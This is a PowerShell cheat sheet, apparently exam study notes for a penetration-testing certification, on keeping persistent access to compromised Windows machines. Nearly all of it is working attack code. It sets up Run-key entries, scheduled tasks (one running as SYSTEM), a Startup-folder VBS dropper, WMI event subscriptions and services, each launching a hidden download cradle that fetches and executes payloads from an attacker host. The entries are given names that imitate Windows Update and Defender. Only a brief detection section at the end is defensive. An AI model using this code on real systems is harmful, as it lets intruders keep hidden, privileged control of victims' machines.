# ============================================================
# Windows Persistence Methods
# ============================================================
# Persistence = ensuring your access survives reboots, logoffs,
# and basic cleanup. OSEP exam boxes often require persistence
# to maintain access while moving laterally.
#
# All methods assume you have at least user-level access.
# Methods marked [ADMIN] require elevated privileges.
# ============================================================


# ============================================================
# METHOD 1: Registry Run Key (user-level, survives reboot)
# ============================================================
# HKCU\Software\Microsoft\Windows\CurrentVersion\Run entries
# execute at user login. No admin required for HKCU.
# HKLM version requires admin but runs for ALL users.
#
# KEY CHOICE:
#   HKCU = only runs for current user, no admin needed
#   HKLM = runs for all users, requires admin [ADMIN]

# Option A: Run a PowerShell download cradle on login
$name  = "WindowsUpdate"   # disguise as legitimate-sounding name
$value = 'powershell -w hidden -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString(''http://192.168.45.202/payload.ps1'')"'
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $name -Value $value

# Option B: Run an in-memory shellcode loader on login [ADMIN for HKLM]
# $value = 'powershell -w hidden -exec bypass -NoProfile -c "[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData(''http://192.168.45.202/loader.exe'')).EntryPoint.Invoke(\$null, @(,@()))"'
# Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $name -Value $value

# Verify:
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Clean up:
# Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $name


# ============================================================
# METHOD 2: Scheduled Tasks
# ============================================================
# Scheduled tasks survive reboots and can run as any user/SYSTEM.
# More flexible than run keys — can trigger on login, time, or events.

# --- Option A: PS cradle on login, runs as current user ---
$taskName = "MicrosoftEdgeUpdate"
$action   = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument '-WindowStyle Hidden -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString(''http://192.168.45.202/payload.ps1'')"'
$trigger  = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force

# --- Option B: Run every 5 minutes (keeps beacon alive) ---
$trigger2 = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) -Once -At (Get-Date)
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger2 -Force

# --- Option C: In-memory payload via scheduled task [ADMIN] ---
# Runs SYSTEM-level scheduled task that loads assembly into memory.
# No binary on disk — the scheduled task downloads and executes in memory.
$sysAction = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument '-w hidden -exec bypass -NoProfile -c "& {$b=(New-Object Net.WebClient).DownloadData(''http://192.168.45.202/loader.exe'');[System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,@(,@()))}"'
$sysTrigger = New-ScheduledTaskTrigger -AtStartup
$sysPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "WindowsDefenderUpdate" -Action $sysAction -Trigger $sysTrigger -Principal $sysPrincipal -Force

# cmd.exe alternative (from cmd shell):
# schtasks /Create /TN "WindowsUpdate" /TR "powershell -w hidden -exec bypass -c IEX((New-Object Net.WebClient).DownloadString('http://KALI/payload.ps1'))" /SC ONLOGON /F

# Verify:
Get-ScheduledTask | Where-Object TaskName -like "*$taskName*"

# Clean up:
# Unregister-ScheduledTask -TaskName $taskName -Confirm:$false


# ============================================================
# METHOD 3: Startup Folder
# ============================================================
# Files in the Startup folder run when the user logs in.
# Low-tech, highly reliable, no admin for CurrentUser folder.
#
# CurrentUser: C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
# AllUsers:    C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\   [ADMIN]

# Drop a .vbs file that runs a PS payload silently:
$startupPath = [System.Environment]::GetFolderPath("Startup")
$vbsContent  = @"
Set oShell = CreateObject("WScript.Shell")
oShell.Run "powershell -w hidden -exec bypass -c ""IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.202/payload.ps1')""", 0, False
"@
$vbsContent | Out-File "$startupPath\WindowsUpdate.vbs" -Encoding ASCII

# Verify:
Get-ChildItem $startupPath

# Clean up:
# Remove-Item "$startupPath\WindowsUpdate.vbs" -Force


# ============================================================
# METHOD 4: WMI Event Subscription (most persistent, survives Defender)
# ============================================================
# WMI subscriptions are stored in the WMI repository — not as files.
# They survive reboots, are hard to detect, and run in a SYSTEM process.
# This is the hardest to remove without knowing it's there.
#
# Three parts:
#   1. EventFilter   — WHAT to watch for (e.g. every 5 minutes)
#   2. EventConsumer — WHAT to do (run a command)
#   3. FilterToConsumerBinding — links filter to consumer
#
# REQUIRES: Admin

$filterName   = "SecurityHealthFilter"
$consumerName = "SecurityHealthConsumer"
$payload      = 'powershell -w hidden -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString(''http://192.168.45.202/payload.ps1'')"'

# Create the event filter (fires every 5 minutes):
$filterQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name           = $filterName
    EventNamespace = "root\cimv2"
    QueryLanguage  = "WQL"
    Query          = $filterQuery
}

# Create the command line consumer:
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name             = $consumerName
    ExecutablePath   = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    CommandLineTemplate = $payload
}

# Bind filter to consumer:
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter   = $filter
    Consumer = $consumer
}

# Verify:
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object Name -eq $filterName
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object Name -eq $consumerName

# Clean up:
# Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -like "*$filterName*"} | Remove-WmiObject
# Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object Name -eq $filterName | Remove-WmiObject
# Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object Name -eq $consumerName | Remove-WmiObject


# ============================================================
# METHOD 5: Service Installation [ADMIN]
# ============================================================
# Creating a service that runs at startup. Most resilient —
# services restart automatically if they crash.

$svcName = "WindowsUpdateSvc"
$svcExe  = "C:\Windows\Temp\svc.exe"

# If you have a compiled service binary:
# sc.exe create $svcName binPath= "$svcExe" start= auto
# sc.exe start $svcName

# Or use PowerShell:
New-Service -Name $svcName `
    -BinaryPathName "cmd.exe /c powershell -w hidden -exec bypass -c `"IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.202/payload.ps1')`"" `
    -StartupType Automatic `
    -DisplayName "Windows Update Service"

# Note: cmd.exe as binPath is a common trick — the service starts cmd,
# which runs your PS command. The service will appear as "stopped" after
# cmd exits, but your payload has already run.

# For a proper persistent service, compile a ServiceBase wrapper in C#
# or use a binary that daemonizes.

# Clean up:
# Stop-Service $svcName -Force
# Remove-Service $svcName   # PS 6+, or: sc.exe delete $svcName


# ============================================================
# Detection: Check what persistence exists on a box
# ============================================================

Write-Host "=== Run Keys ===" -ForegroundColor Cyan
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue

Write-Host "=== Scheduled Tasks ===" -ForegroundColor Cyan
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft\*" } | Select TaskName, TaskPath, State

Write-Host "=== Startup Folder ===" -ForegroundColor Cyan
Get-ChildItem ([System.Environment]::GetFolderPath("Startup"))
Get-ChildItem "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\" -ErrorAction SilentlyContinue

Write-Host "=== WMI Subscriptions ===" -ForegroundColor Cyan
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Select Name, Query
